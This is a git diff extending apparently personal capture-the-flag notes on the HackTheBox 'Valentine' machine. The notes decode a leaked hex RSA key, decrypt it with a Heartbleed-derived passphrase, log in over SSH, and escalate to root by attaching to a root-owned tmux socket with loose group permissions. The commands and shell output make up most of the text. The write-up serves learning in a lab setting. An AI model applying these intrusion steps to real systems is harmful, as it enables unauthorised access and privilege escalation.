@@ -78,6 +78,10 @@ Progress: 4614 / 4615 (99.98%)
 ===============================================================
 ```
 
+## Check the website
+
+![[Pasted image 20230214160209.png]]
+
 ## Searchsploit
 ```
 searchsploit heartbleed
@@ -175,18 +179,118 @@ heartbleedbelievethehype
 
 # Foothold
 
+## Get Hype's shell
 ## hype_key
 
 hype_key from the website is written in hex, so we use xxd to decode it. The result is rsa key for a user hype.
 ```
-xxd -r -p hype_key > hype.rsa
+xxd -r -p hype_key > hype_key_xxd
 ```
 
-### Decode rsa
+### Decode RSA
+use the passphrase `heartbleedbelievethehype`
 ```
-chmod 600 hype.rsa   
-ssh -i hype.rsa hype@valentine.htb 
+openssl rsa -in hype_key_xxd -out hype.rsa  
 ```
 
 
+### Connection
+```
+ssh -i hype.rsa hype@valentine.htb         
+sign_and_send_pubkey: no mutual signature supported
+```
 
+```
+ssh  -o 'PubkeyAcceptedKeyTypes +ssh-rsa'  -i hype.rsa hype@valentine.htb
+Welcome to Ubuntu 12.04 LTS (GNU/Linux 3.2.0-23-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com/
+
+New release '14.04.5 LTS' available.
+Run 'do-release-upgrade' to upgrade to it.
+
+Last login: Fri Feb 16 14:50:29 2018 from 10.10.14.3
+hype@Valentine:~$ 
+```
+
+### Flag
+user flag is in the Desktop
+
+
+# Privilege Escalation
+## Enumeration
+
+### sudo -l
+The passphrase did not work, so we cannot do it?
+
+### history
+```
+hype@Valentine:~/Desktop$ history
+    1  exit
+    2  exot
+    3  exit
+    4  ls -la
+    5  cd /
+    6  ls -la
+    7  cd .devs
+    8  ls -la
+    9  tmux -L dev_sess 
+   10  tmux a -t dev_sess 
+   11  tmux --help
+   12  tmux -S /.devs/dev_sess 
+   13  exit
+```
+
+### ps aux | grep root
+```
+root       1203  0.0  0.1  26416  1680 ?        Ss   18:23   0:03 /usr/bin/tmux -S /.devs/dev_sess
+```
+tmux??
+
+### man tmux
+```
+-L socket-name
+                   tmux stores the server socket in a directory under /tmp (or TMPDIR if set); the default
+                   socket is named default.  This option allows a different socket name to be specified,
+                   allowing several independent tmux servers to be run.  Unlike -S a full path is not neces‐
+                   sary: the sockets are all created in the same directory.
+
+                   If the socket is accidentally removed, the SIGUSR1 signal may be sent to the tmux server
+                   process to recreate it.
+```
+
+
+```
+-S socket-path
+                   Specify a full alternative path to the server socket.  If -S is specified, the default
+                   socket directory is not used and any -L flag is ignored.
+```
+
+### tmux options
+`/.devs/dev_sess`
+
+```
+ls -al
+total 8
+drwxr-xr-x  2 root hype 4096 Feb 13 18:23 .
+drwxr-xr-x 26 root root 4096 Aug 25 03:02 ..
+srw-rw----  1 root hype    0 Feb 13 18:23 dev_sess
+```
+
+Zero bytes?
+It is owned by root but its group is hype.
+
+There is a socket with loose permissions
+```
+hype@Valentine:/.devs$ file dev_sess
+dev_sess: socket
+```
+
+![[Pasted image 20230214161452.png]]
+## root
+```
+hype@Valentine:/.devs$ tmux -S dev_sess
+root@Valentine:/.devs# whoami
+root
+
+```
